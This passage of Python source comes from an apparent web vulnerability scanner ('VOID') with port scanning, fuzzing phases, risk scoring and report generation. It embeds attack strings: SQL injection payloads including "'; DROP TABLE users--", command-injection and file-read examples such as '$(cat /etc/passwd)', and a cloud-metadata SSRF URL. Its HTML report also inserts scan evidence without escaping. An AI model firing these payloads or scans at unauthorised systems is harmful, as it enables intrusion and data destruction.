    async def get_vulnerabilities(self, scan_id: int=None, severity: str=None) -> List[Dict]:
        query = 'SELECT * FROM vulnerabilities'
        params = []
        if scan_id:
            query += ' WHERE scan_id = ?'
            params.append(scan_id)
        if severity:
            if scan_id:
                query += ' AND severity = ?'
            else:
                query += ' WHERE severity = ?'
            params.append(severity)
        query += ' ORDER BY timestamp DESC'
        self.cursor.execute(query, params)
        rows = self.cursor.fetchall()
        columns = [description[0] for description in self.cursor.description]
        results = []
        for row in rows:
            results.append(dict(zip(columns, row)))
        return results

    async def cleanup_old_records(self):
        if not Config.DATABASE_AUTO_CLEANUP:
            return
        cutoff = datetime.now() - timedelta(days=Config.DATABASE_CLEANUP_DAYS)
        self.cursor.execute('\n            DELETE FROM scans WHERE start_time < ?\n        ', (cutoff,))
        self.cursor.execute('\n            DELETE FROM vulnerabilities WHERE timestamp < ?\n        ', (cutoff,))
        self.conn.commit()
        self.logger.info(f'Cleaned up records older than {Config.DATABASE_CLEANUP_DAYS} days')

    async def backup(self):
        if not Config.DATABASE_BACKUP_ENABLED:
            return
        if Config.DATABASE_TYPE == 'sqlite':
            backup_file = Config.BASE_DIR / f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db"
            shutil.copy2(Config.DATABASE_FILE, backup_file)
            self.logger.info(f'Database backed up to {backup_file}')

    def close(self):
        if self.conn:
            self.conn.close()

class PluginSystem:

    def __init__(self):
        self.plugins = {}
        self.loaded_plugins = []
        self.logger = logging.getLogger('plugin-system')

    def load_plugins(self):
        if not Config.PLUGIN_SYSTEM_ENABLED:
            self.logger.info('Plugin system disabled')
            return
        for plugin_name in Config.BUILTIN_PLUGINS:
            try:
                plugin = self._load_builtin_plugin(plugin_name)
                if plugin:
                    self.plugins[plugin_name] = plugin
                    self.logger.info(f'Loaded built-in plugin: {plugin_name}')
            except Exception as e:
                self.logger.error(f'Failed to load plugin {plugin_name}: {e}')
        if Config.PLUGIN_ALLOW_EXTERNAL:
            for plugin_file in Config.PLUGINS_DIR.glob('*.py'):
                try:
                    plugin_name = plugin_file.stem
                    plugin = self._load_external_plugin(plugin_file)
                    if plugin:
                        self.plugins[plugin_name] = plugin
                        self.logger.info(f'Loaded external plugin: {plugin_name}')
                except Exception as e:
                    self.logger.error(f'Failed to load plugin {plugin_file}: {e}')

    def _load_builtin_plugin(self, plugin_name: str) -> Optional[Any]:
        return {'name': plugin_name, 'type': 'builtin'}

    def _load_external_plugin(self, plugin_file: Path) -> Optional[Any]:
        return {'name': plugin_file.stem, 'type': 'external', 'path': str(plugin_file)}

    def get_plugin(self, name: str) -> Optional[Any]:
        return self.plugins.get(name)

    def get_all_plugins(self) -> List[Any]:
        return list(self.plugins.values())

    def run_plugin(self, name: str, *args, **kwargs) -> Optional[Any]:
        plugin = self.get_plugin(name)
        if plugin and hasattr(plugin, 'run'):
            try:
                return plugin.run(*args, **kwargs)
            except Exception as e:
                self.logger.error(f'Plugin {name} error: {e}')
        return None

    def run_all_plugins(self, *args, **kwargs) -> List[Any]:
        results = []
        for (name, plugin) in self.plugins.items():
            result = self.run_plugin(name, *args, **kwargs)
            if result:
                results.append(result)
        return results

class TargetProfiler:

    def __init__(self, http_client):
        self.http = http_client
        self.logger = logging.getLogger('target-profiler')

    async def profile(self, url: str) -> Dict:
        profile = {'url': url, 'domain': urlparse(url).netloc, 'ip': None, 'ports': [], 'ssl': {}, 'whois': {}, 'dns': {}, 'technologies': {}}
        parsed = urlparse(url)
        domain = parsed.netloc
        if Config.PROFILER_COLLECT_IP_INFO:
            try:
                profile['ip'] = socket.gethostbyname(domain)
            except:
                pass
        if Config.PROFILER_SCAN_PORTS:
            profile['ports'] = await self._scan_ports(domain)
        if Config.PROFILER_ANALYZE_SSL and parsed.scheme == 'https':
            profile['ssl'] = await self._analyze_ssl(domain)
        if Config.PROFILER_WHOIS_LOOKUP:
            try:
                w = whois.whois(domain)
                profile['whois'] = {'registrar': w.registrar, 'creation_date': str(w.creation_date), 'expiration_date': str(w.expiration_date), 'name_servers': w.name_servers}
            except:
                pass
        if Config.PROFILER_DNS_ANALYSIS:
            profile['dns'] = await self._analyze_dns(domain)
        return profile

    async def _scan_ports(self, domain: str) -> List[Dict]:
        open_ports = []
        for port in Config.PROFILER_COMMON_PORTS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(Config.PROFILER_PORT_SCAN_TIMEOUT)
                result = sock.connect_ex((domain, port))
                if result == 0:
                    try:
                        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
                        banner = sock.recv(1024).decode('utf-8', errors='ignore')[:100]
                    except:
                        banner = None
                    open_ports.append({'port': port, 'service': self._get_service_name(port), 'banner': banner})
                sock.close()
            except:
                pass
        return open_ports

    def _get_service_name(self, port: int) -> str:
        services = {21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5900: 'VNC', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'}
        return services.get(port, 'unknown')

    async def _analyze_ssl(self, domain: str) -> Dict:
        ssl_info = {}
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    ssl_info = {'version': ssock.version(), 'cipher': ssock.cipher(), 'cert_subject': dict((x[0] for x in cert['subject'])), 'cert_issuer': dict((x[0] for x in cert['issuer'])), 'cert_expiry': cert['notAfter'], 'cert_serial': cert.get('serialNumber')}
        except Exception as e:
            ssl_info['error'] = str(e)
        return ssl_info

    async def _analyze_dns(self, domain: str) -> Dict:
        dns_info = {}
        try:
            answers = dns.resolver.resolve(domain, 'A')
            dns_info['A'] = [str(r) for r in answers]
        except:
            pass
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            dns_info['MX'] = [str(r.exchange) for r in answers]
        except:
            pass
        try:
            answers = dns.resolver.resolve(domain, 'NS')
            dns_info['NS'] = [str(r) for r in answers]
        except:
            pass
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            dns_info['TXT'] = [str(r) for r in answers]
        except:
            pass
        return dns_info

class RiskScoringSystem:

    def __init__(self):
        self.logger = logging.getLogger('risk-scoring')

    def calculate_score(self, vuln: Dict) -> Dict:
        score_info = {'base_score': 0, 'exploitability_score': 0, 'impact_score': 0, 'severity': 'Info', 'vector': ''}
        exploitability = 0
        if Config.RISK_SCORE_BASED_ON_EXPLOITABILITY:
            exploitability = self._calculate_exploitability(vuln)
            score_info['exploitability_score'] = exploitability
        impact = 0
        if Config.RISK_SCORE_BASED_ON_IMPACT:
            impact = self._calculate_impact(vuln)
            score_info['impact_score'] = impact
        confidence = vuln.get('confidence', 0.5)
        if exploitability > 0 and impact > 0:
            base_score = round((exploitability * Config.CVSS_WEIGHTS['exploitability'] + impact * Config.CVSS_WEIGHTS['impact'] + confidence * Config.CVSS_WEIGHTS['confidence']) * 10, 1)
            score_info['base_score'] = min(base_score, 10)
        else:
            base_score = self._simplified_scoring(vuln)
            score_info['base_score'] = base_score
        score_info['severity'] = self._get_severity(score_info['base_score'])
        score_info['vector'] = self._build_vector(vuln, score_info)
        return score_info

    def _calculate_exploitability(self, vuln: Dict) -> float:
        score = 0.5
        vuln_type = vuln.get('type', '').lower()
        if 'sql' in vuln_type:
            score += 0.3
        elif 'xss' in vuln_type:
            score += 0.2
        elif 'command' in vuln_type:
            score += 0.4
        elif 'lfi' in vuln_type:
            score += 0.3
        elif 'ssrf' in vuln_type:
            score += 0.3
        if vuln.get('requires_auth'):
            score -= 0.2
        complexity = vuln.get('complexity', 'medium')
        if complexity == 'low':
            score += 0.2
        elif complexity == 'high':
            score -= 0.2
        return min(max(score, 0), 1)

    def _calculate_impact(self, vuln: Dict) -> float:
        score = 0.5
        conf_impact = vuln.get('confidentiality_impact', 'none')
        if conf_impact == 'high':
            score += 0.3
        elif conf_impact == 'low':
            score += 0.1
        int_impact = vuln.get('integrity_impact', 'none')
        if int_impact == 'high':
            score += 0.3
        elif int_impact == 'low':
            score += 0.1
        avail_impact = vuln.get('availability_impact', 'none')
        if avail_impact == 'high':
            score += 0.2
        elif avail_impact == 'low':
            score += 0.1
        return min(max(score, 0), 1)

    def _simplified_scoring(self, vuln: Dict) -> float:
        type_scores = {'SQL Injection': 9.0, 'Command Injection': 9.0, 'Remote File Inclusion': 8.5, 'Local File Inclusion': 7.5, 'SSRF': 7.0, 'XSS': 6.0, 'CSRF': 5.0, 'Open Redirect': 4.0, 'Information Disclosure': 3.0}
        base_score = type_scores.get(vuln.get('type', ''), 5.0)
        confidence = vuln.get('confidence', 0.5)
        base_score *= confidence
        return round(base_score, 1)

    def _get_severity(self, score: float) -> str:
        for (severity, (min_score, max_score)) in Config.RISK_LEVELS.items():
            if min_score <= score <= max_score:
                return severity.upper()
        return 'INFO'

    def _build_vector(self, vuln: Dict, score_info: Dict) -> str:
        vector_parts = []
        av = vuln.get('attack_vector', 'network')
        vector_parts.append(f'AV:{av[0].upper()}')
        ac = vuln.get('complexity', 'medium')
        vector_parts.append(f'AC:{ac[0].upper()}')
        pr = vuln.get('privileges_required', 'none')
        vector_parts.append(f'PR:{pr[0].upper()}')
        ui = 'R' if vuln.get('user_interaction') else 'N'
        vector_parts.append(f'UI:{ui}')
        s = 'C' if vuln.get('scope_changed') else 'U'
        vector_parts.append(f'S:{s}')
        ci = vuln.get('confidentiality_impact', 'none')
        vector_parts.append(f'C:{ci[0].upper()}')
        ii = vuln.get('integrity_impact', 'none')
        vector_parts.append(f'I:{ii[0].upper()}')
        ai = vuln.get('availability_impact', 'none')
        vector_parts.append(f'A:{ai[0].upper()}')
        return f"CVSS:3.0/{'/'.join(vector_parts)}"

class AutoRescanSystem:

    def __init__(self, scanner):
        self.scanner = scanner
        self.logger = logging.getLogger('auto-rescan')
        self.rescan_history = []

    async def should_rescan(self, finding: Dict) -> bool:
        if not Config.AUTO_RESCAN_ENABLED:
            return False
        finding_id = f"{finding.get('url')}:{finding.get('parameter')}"
        if finding_id in self.rescan_history:
            return False
        confidence = finding.get('confidence', 0)
        if confidence < Config.AUTO_RESCAN_MIN_CONFIDENCE:
            return True
        severity = finding.get('severity', 'low').lower()
        if severity in ['critical', 'high']:
            return True
        return False

    async def rescan(self, finding: Dict) -> Dict:
        self.logger.info(f"Rescanning: {finding.get('url')} - {finding.get('parameter')}")
        result = {'original': finding, 'confirmed': False, 'new_evidence': [], 'attempts': 0}
        url = finding.get('url')
        param = finding.get('parameter')
        for attempt in range(Config.AUTO_RESCAN_MAX_ATTEMPTS):
            result['attempts'] = attempt + 1
            await asyncio.sleep(Config.AUTO_RESCAN_DELAY)
            if Config.AUTO_RESCAN_DEEPER_TESTS:
                deeper_result = await self._run_deeper_tests(url, param, finding)
                if deeper_result:
                    result['new_evidence'].extend(deeper_result)
            if self._is_confirmed(finding, result['new_evidence']):
                result['confirmed'] = True
                break
        finding_id = f'{url}:{param}'
        self.rescan_history.append(finding_id)
        return result

    async def _run_deeper_tests(self, url: str, param: str, original: Dict) -> List[Dict]:
        evidence = []
        aggressive_payloads = ["' OR '1'='1'--", "' UNION SELECT NULL,NULL,NULL--", "'; DROP TABLE users--", "' AND SLEEP(10)--", "' AND BENCHMARK(10000000,MD5('test'))--"]
        for payload in aggressive_payloads:
            pass
        return evidence

    def _is_confirmed(self, original: Dict, new_evidence: List[Dict]) -> bool:
        if new_evidence:
            for evidence in new_evidence:
                if evidence.get('confidence', 0) > original.get('confidence', 0):
                    return True
        return False

class SecurityKnowledgeBase:

    def __init__(self):
        self.logger = logging.getLogger('knowledge-base')
        self.knowledge = {}
        self.load_knowledge()

    def load_knowledge(self):
        kb_files = list(Config.KNOWLEDGE_BASE_DIR.glob('*.json'))
        kb_files.extend(Config.KNOWLEDGE_BASE_DIR.glob('*.yaml'))
        for kb_file in kb_files:
            try:
                with open(kb_file, 'r') as f:
                    if kb_file.suffix == '.json':
                        data = json.load(f)
                    else:
                        data = yaml.safe_load(f)
                    if isinstance(data, dict):
                        self.knowledge.update(data)
                        self.logger.info(f'Loaded knowledge from {kb_file.name}')
            except Exception as e:
                self.logger.error(f'Error loading {kb_file}: {e}')
        if not self.knowledge:
            self.load_builtin_knowledge()

    def load_builtin_knowledge(self):
        self.knowledge = {'SQL Injection': {'description': 'SQL injection occurs when user input is improperly sanitized before being used in SQL queries.', 'risk': 'An attacker can read, modify, or delete database data, potentially gaining unauthorized access.', 'remediation': 'Use parameterized queries/prepared statements, input validation, and least privilege principles.', 'references': ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html'], 'cwe': 'CWE-89', 'examples': ["' OR '1'='1'--", "' UNION SELECT username,password FROM users--"]}, 'XSS': {'description': 'Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users.', 'risk': 'Session hijacking, defacement, redirection to malicious sites, credential theft.', 'remediation': 'Implement proper output encoding, use Content Security Policy (CSP), validate input.', 'references': ['https://owasp.org/www-community/attacks/xss/', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'], 'cwe': 'CWE-79', 'examples': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']}, 'LFI': {'description': 'Local File Inclusion allows attackers to include local files on the server.', 'risk': 'Read sensitive files, potentially leading to information disclosure or RCE.', 'remediation': 'Validate file paths, use whitelist approach, disable allow_url_include.', 'references': ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion'], 'cwe': 'CWE-98', 'examples': ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini']}, 'SSRF': {'description': 'Server-Side Request Forgery allows attackers to make requests from the vulnerable server.', 'risk': 'Access internal systems, port scanning, cloud metadata exposure, DoS.', 'remediation': 'Implement allowlists of allowed URLs, validate and sanitize input, disable unwanted redirects.', 'references': ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'], 'cwe': 'CWE-918', 'examples': ['http://169.254.169.254/latest/meta-data/', 'http://localhost:22']}, 'Command Injection': {'description': 'Command injection allows attackers to execute arbitrary commands on the host operating system.', 'risk': 'Complete system compromise, data theft, lateral movement.', 'remediation': 'Avoid system calls with user input, use APIs instead, validate and sanitize input.', 'references': ['https://owasp.org/www-community/attacks/Command_Injection', 'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'], 'cwe': 'CWE-78', 'examples': ['; id', '| whoami', '$(cat /etc/passwd)']}, 'IDOR': {'description': 'Insecure Direct Object References occur when an application exposes direct references to internal objects.', 'risk': "Unauthorized access to other users' data, privilege escalation.", 'remediation': 'Implement proper access controls, use indirect references, validate user permissions.', 'references': ['https://owasp.org/www-community/attacks/Insecure_Direct_Object_References'], 'cwe': 'CWE-639', 'examples': ['/user/123', '/api/user?id=456']}, 'Open Redirect': {'description': 'Open redirect occurs when an application redirects users to a URL specified via user input.', 'risk': 'Phishing attacks, malware distribution, trust exploitation.', 'remediation': 'Validate redirect URLs, use allowlist of trusted domains, avoid user-controlled redirects.', 'references': ['https://owasp.org/www-community/attacks/Open_redirect'], 'cwe': 'CWE-601', 'examples': ['/redirect?url=http://evil.com', '?next=https://malicious.com']}, 'CSRF': {'description': 'Cross-Site Request Forgery forces authenticated users to execute unwanted actions.', 'risk': 'State-changing operations performed without user consent, account takeover.', 'remediation': 'Use CSRF tokens, SameSite cookies, re-authentication for sensitive actions.', 'references': ['https://owasp.org/www-community/attacks/csrf', 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'], 'cwe': 'CWE-352'}, 'File Upload': {'description': 'Insecure file upload allows attackers to upload malicious files to the server.', 'risk': 'Remote code execution, malware distribution, server compromise.', 'remediation': 'Validate file types, scan for malware, store files outside webroot, use random filenames.', 'references': ['https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload', 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html'], 'cwe': 'CWE-434', 'examples': ['shell.php', 'image.php.jpg']}}

    def get_info(self, vuln_type: str) -> Dict:
        return self.knowledge.get(vuln_type, {'description': 'No information available', 'risk': 'Unknown', 'remediation': 'No specific remediation available', 'references': []})

    def enhance_vulnerability(self, vuln: Dict) -> Dict:
        vuln_type = vuln.get('type', '')
        for (kb_type, info) in self.knowledge.items():
            if kb_type.lower() in vuln_type.lower() or vuln_type.lower() in kb_type.lower():
                vuln['description'] = info.get('description', vuln.get('description', ''))
                vuln['risk'] = info.get('risk', '')
                vuln['remediation'] = info.get('remediation', vuln.get('remediation', ''))
                vuln['references'] = info.get('references', [])
                vuln['cwe'] = info.get('cwe', vuln.get('cwe', ''))
                vuln['examples'] = info.get('examples', [])
                break
        return vuln

    def search(self, query: str) -> List[Dict]:
        results = []
        query_lower = query.lower()
        for (vuln_type, info) in self.knowledge.items():
            if query_lower in vuln_type.lower() or query_lower in info.get('description', '').lower() or query_lower in info.get('cwe', '').lower():
                results.append({'type': vuln_type, 'info': info})
        return results

    def get_cwe_info(self, cwe_id: str) -> Optional[Dict]:
        for (vuln_type, info) in self.knowledge.items():
            if info.get('cwe') == cwe_id:
                return {'cwe': cwe_id, 'type': vuln_type, 'info': info}
        return None

class VoidStrikeApplication:

    def __init__(self, gui_mode: bool=False):
        self.gui_mode = gui_mode
        self.config = Config
        self.logger = logging.getLogger('voidstrike')
        self.http = None
        self.scanner = None
        self.crawler = None
        self.param_discovery = None
        self.fuzzing_engine = None
        self.remote_analyzer = None
        self.attack_mapper = None
        self.waf_detector = None
        self.tech_fingerprinter = None
        self.async_scanner = None
        self.js_analyzer = None
        self.database = None
        self.plugin_system = None
        self.target_profiler = None
        self.risk_scoring = None
        self.auto_rescan = None
        self.knowledge_base = None
        self.setup_logging()
        self.config.load()
        self.config.initialize()
        self.gui = None
        if gui_mode:
            self.gui = VisualSecurityDashboard()
        self._remote_for_this_scan = False

    def setup_logging(self):
        log_file = self.config.LOG_FILE
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        file_handler = RotatingFileHandler(log_file, maxBytes=10 * 1024 * 1024, backupCount=5)
        file_handler.setFormatter(formatter)
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        root_logger = logging.getLogger()
        root_logger.setLevel(logging.INFO)
        root_logger.addHandler(file_handler)
        root_logger.addHandler(console_handler)

    async def initialize(self):
        self.logger.info('Initializing components…')
        self.async_scanner = AsyncHighSpeedScanner(Config.ASYNC_MAX_CONCURRENT)
        await self.async_scanner.initialize()
        self.crawler = SmartCrawler(self.async_scanner)
        self.param_discovery = ParameterDiscoverySystem(self.async_scanner)
        self.fuzzing_engine = AdvancedFuzzingEngine(self.async_scanner)
        self.remote_analyzer = ResponseAnalyzer()
        self.attack_mapper = AttackSurfaceMapper()
        self.waf_detector = WAFDetectionSystem(self.async_scanner)
        self.tech_fingerprinter = TechnologyFingerprinter(self.async_scanner)
        self.js_analyzer = JavaScriptAnalyzer(self.async_scanner)
        self.target_profiler = TargetProfiler(self.async_scanner)
        self.risk_scoring = RiskScoringSystem()
        self.knowledge_base = SecurityKnowledgeBase()
        if Config.DATABASE_ENABLED:
            self.database = DatabaseSystem()
            await self.database.initialize()
        self.plugin_system = PluginSystem()
        self.plugin_system.load_plugins()
        self.auto_rescan = AutoRescanSystem(self)
        self.logger.info('All components initialized successfully')

    async def scan(self, target: str, profile: str='standard', options: Dict=None) -> Dict:
        self.logger.info(f'Starting scan on {target} with profile {profile}')
        if not self.async_scanner:
            await self.initialize()
        profile_config = dict(Config.SCAN_MODES.get(profile, Config.SCAN_MODES['standard']))
        opts = dict(options) if options else {}
        use_remote = bool(opts.pop('use_remote_analysis', False))
        profile_config.update(opts)
        self._remote_for_this_scan = False
        if self.remote_analyzer:
            self.remote_analyzer.refresh_connection()
            self._remote_for_this_scan = bool(use_remote and Config.AI_ANALYZER_ENABLED and self.remote_analyzer.enabled and self.remote_analyzer.client)
        results = {'target': target, 'start_time': datetime.now().isoformat(), 'profile': profile, 'urls_crawled': [], 'parameters': [], 'vulnerabilities': [], 'secrets': [], 'subdomains': [], 'technologies': {}, 'waf': {}, 'attack_surface': {}, 'profile_info': profile_config}
        try:
            self.logger.info('Phase 1: Target Profiling')
            if Config.TARGET_PROFILER_ENABLED:
                profile_info = await self.target_profiler.profile(target)
                results['profile_info'].update(profile_info)
            self.logger.info('Phase 2: WAF Detection')
            if Config.WAF_DETECTION_ENABLED:
                waf_info = await self.waf_detector.detect(target)
                results['waf'] = waf_info
                if waf_info.get('detected'):
                    self.logger.info(f"WAF detected: {', '.join(waf_info.get('wafs', []))}")
            self.logger.info('Phase 3: Technology Fingerprinting')
            if Config.TECH_FINGERPRINTING:
                tech_info = await self.tech_fingerprinter.fingerprint(target)
                results['technologies'] = tech_info
                self.logger.info(f'Technologies detected: {self.tech_fingerprinter.get_summary(tech_info)}')
            self.logger.info('Phase 4: Smart Crawling')
            crawled: List[Dict] = []
            if profile_config.get('depth', 0) > 0:
                crawled = await self.crawler.crawl(target, profile_config.get('depth', 3))
                results['urls_crawled'] = crawled
                self.logger.info(f'Crawled {len(crawled)} URLs')
            self.logger.info('Phase 5: Parameter Discovery')
            if profile_config.get('param_discovery', True):
                parameters = await self.param_discovery.discover_all(target, crawled)
                results['parameters'] = parameters
                self.logger.info(f'Discovered {len(parameters)} parameters')
            self.logger.info('Phase 6: JavaScript Analysis')
            if profile_config.get('js_analysis', False) and Config.JS_ANALYZER_ENABLED:
                js_urls = []
                for page in crawled:
                    js_urls.extend(page.get('scripts', []))
                if js_urls:
                    js_results = await self.js_analyzer.analyze(js_urls)
                    results['secrets'] = js_results.get('secrets', [])
                    self.logger.info(f"Found {len(results['secrets'])} secrets in JavaScript")
            self.logger.info('Phase 7: Advanced Fuzzing')
            if profile_config.get('fuzzing', False) and Config.FUZZING_ENABLED:
                lim = getattr(Config, 'FUZZ_MAX_PARAMS_PER_SCAN', 56)
                for param in results['parameters'][:lim]:
                    fuzz_results = await self.fuzzing_engine.fuzz_parameter(target, param)
                    for result in fuzz_results:
                        if result.get('interesting'):
                            if getattr(self, '_remote_for_this_scan', False):
                                notes = await self.remote_analyzer.analyze_response(result, {'url': target, 'param': param})
                                result['notes'] = notes
                            vuln_type = await self.classify_finding(result)
                            result['type'] = vuln_type
                            risk_info = self.risk_scoring.calculate_score(result)
                            result['severity'] = risk_info['severity']
                            result['risk_score'] = risk_info['base_score']
                            result = self.knowledge_base.enhance_vulnerability(result)
                            results['vulnerabilities'].append(result)
            self.logger.info('Phase 8: Attack Surface Mapping')
            if Config.ATTACK_SURFACE_MAPPING:
                results['attack_surface'] = self.attack_mapper.map_from_crawl(crawled)
                summary = self.attack_mapper.get_summary()
                self.logger.info(f'Attack surface: {summary}')
            if getattr(self, '_remote_for_this_scan', False) and results['vulnerabilities']:
                self.logger.info('Phase 9: model-assisted review')
                for vuln in results['vulnerabilities'][:Config.AI_MAX_ANALYSIS_PER_SCAN]:
                    fp_check = await self.remote_analyzer.check_false_positive(vuln)
                    if fp_check.get('is_false_positive', False) and fp_check.get('confidence', 0) > 70:
                        vuln['false_positive'] = True
                        vuln['fp_reason'] = fp_check.get('reasoning', '')
                    vuln['explanation'] = await self.remote_analyzer.explain_vulnerability(vuln)
            if Config.AUTO_RESCAN_ENABLED:
                self.logger.info('Phase 10: Auto Rescan')
                for vuln in results['vulnerabilities']:
                    if await self.auto_rescan.should_rescan(vuln):
                        rescan_result = await self.auto_rescan.rescan(vuln)
                        if rescan_result.get('confirmed'):
                            vuln['verified'] = True
                            vuln['confidence'] = min(vuln.get('confidence', 0) + 0.2, 1.0)
            if self.database and self.database.initialized:
                self.logger.info('Phase 11: Saving to Database')
                target_id = await self.database.save_target(target)
                scan_id = await self.database.save_scan(target_id, results)
                await self.database.save_vulnerabilities(scan_id, results['vulnerabilities'])
                await self.database.save_secrets(scan_id, results['secrets'])
            results['end_time'] = datetime.now().isoformat()
            results['duration'] = (datetime.fromisoformat(results['end_time']) - datetime.fromisoformat(results['start_time'])).total_seconds()
            self.logger.info(f"Scan completed in {results['duration']:.2f} seconds")
            self.logger.info(f"Found {len(results['vulnerabilities'])} vulnerabilities")
        except Exception as e:
            self.logger.error(f'Scan error: {e}')
            import traceback
            traceback.print_exc()
        return results

    async def classify_finding(self, finding: Dict) -> str:
        if self.remote_analyzer and getattr(self, '_remote_for_this_scan', False):
            classification = await self.remote_analyzer.classify_vulnerability(finding)
            return classification.get('classification', 'Unknown')
        content = finding.get('evidence', '').lower()
        if any((word in content for word in ['sql', 'mysql', 'postgresql', 'oracle'])):
            return 'SQL Injection'
        elif any((word in content for word in ['xss', 'script', 'alert', 'onerror'])):
            return 'XSS'
        elif any((word in content for word in ['root:', 'passwd', 'win.ini'])):
            return 'LFI'
        elif any((word in content for word in ['169.254', 'localhost', 'metadata'])):
            return 'SSRF'
        elif any((word in content for word in ['uid=', 'gid=', 'whoami'])):
            return 'Command Injection'
        return 'Unknown'

    async def generate_report(self, results: Dict, format: str='html') -> str:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = Config.REPORTS_DIR / f'report_{timestamp}.{format}'
        if format == 'html':
            return await self._generate_html_report(results, filename)
        elif format == 'json':
            return await self._generate_json_report(results, filename)
        elif format == 'csv':
            return await self._generate_csv_report(results, filename)
        elif format == 'markdown':
            return await self._generate_markdown_report(results, filename)
        return str(filename)

    async def _generate_html_report(self, results: Dict, filename: Path) -> str:
        html = f"""<!DOCTYPE html>\n<html>\n<head>\n    <title>VOID report — {results['target']}</title>\n    <style>\n        body {{ font-family: 'Segoe UI', Arial, sans-serif; margin: 20px; background: #f5f5f5; }}\n        .container {{ max-width: 1200px; margin: auto; background: white; padding: 30px; border-radius: 10px; }}\n        h1 {{ color: #1976D2; }}\n        h2 {{ color: #333; margin-top: 30px; }}\n        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; margin: 30px 0; }}\n        .stat-card {{ background: #f8f9fa; padding: 20px; border-radius: 8px; text-align: center; }}\n        .stat-value {{ font-size: 32px; font-weight: bold; color: #1976D2; }}\n        .stat-label {{ color: #666; }}\n        .vuln-card {{ background: #f8f9fa; border-left: 4px solid; padding: 15px; margin: 10px 0; }}\n        .critical {{ border-color: #F44336; }}\n        .high {{ border-color: #FF9800; }}\n        .medium {{ border-color: #FFC107; }}\n        .low {{ border-color: #4CAF50; }}\n        .info {{ border-color: #2196F3; }}\n        table {{ width: 100%; border-collapse: collapse; }}\n        th {{ background: #1976D2; color: white; padding: 10px; }}\n        td {{ padding: 10px; border-bottom: 1px solid #ddd; }}\n        .footer {{ margin-top: 30px; text-align: center; color: #999; }}\n    </style>\n</head>\n<body>\n    <div class="container">\n        <h1>VOID</h1>\n        <p><strong>Target:</strong> {results['target']}</p>\n        <p><strong>Scan Date:</strong> {results['start_time']}</p>\n        <p><strong>Duration:</strong> {results.get('duration', 0):.2f} seconds</p>\n        <p><strong>Profile:</strong> {results.get('profile', 'standard')}</p>\n        \n        <div class="stats">\n            <div class="stat-card">\n                <div class="stat-value">{len(results.get('urls_crawled', []))}</div>\n                <div class="stat-label">URLs Crawled</div>\n            </div>\n            <div class="stat-card">\n                <div class="stat-value">{len(results.get('parameters', []))}</div>\n                <div class="stat-label">Parameters</div>\n            </div>\n            <div class="stat-card">\n                <div class="stat-value">{len(results.get('vulnerabilities', []))}</div>\n                <div class="stat-label">Vulnerabilities</div>\n            </div>\n            <div class="stat-card">\n                <div class="stat-value">{len(results.get('secrets', []))}</div>\n                <div class="stat-label">Secrets</div>\n            </div>\n        </div>\n        \n        <h2>Vulnerabilities</h2>\n        """
        for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
            vulns = [v for v in results.get('vulnerabilities', []) if v.get('severity', '').upper() == severity.upper()]
            if vulns:
                html += f'<h3>{severity} ({len(vulns)})</h3>'
                for vuln in vulns:
                    html += f"""\n                    <div class="vuln-card {severity.lower()}">\n                        <strong>{vuln.get('type', 'Unknown')}</strong>\n                        <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>\n                        <p><strong>Parameter:</strong> {vuln.get('parameter', 'N/A')}</p>\n                        <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>\n                        <p><strong>Confidence:</strong> {vuln.get('confidence', 0)}%</p>\n                        <p><strong>Risk Score:</strong> {vuln.get('risk_score', 0)}/10</p>\n                    </div>\n                    """
        html += '\n        <div class="footer">\n            VOID v' + Config.VERSION + '\n        </div>\n    </div>\n</body>\n</html>'
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html)
        self.logger.info(f'HTML report generated: {filename}')
        return str(filename)

    async def _generate_json_report(self, results: Dict, filename: Path) -> str:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, default=str)
        self.logger.info(f'JSON report generated: {filename}')
        return str(filename)

    async def _generate_csv_report(self, results: Dict, filename: Path) -> str:
        import csv
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Severity', 'Type', 'URL', 'Parameter', 'Confidence', 'Evidence'])
            for vuln in results.get('vulnerabilities', []):
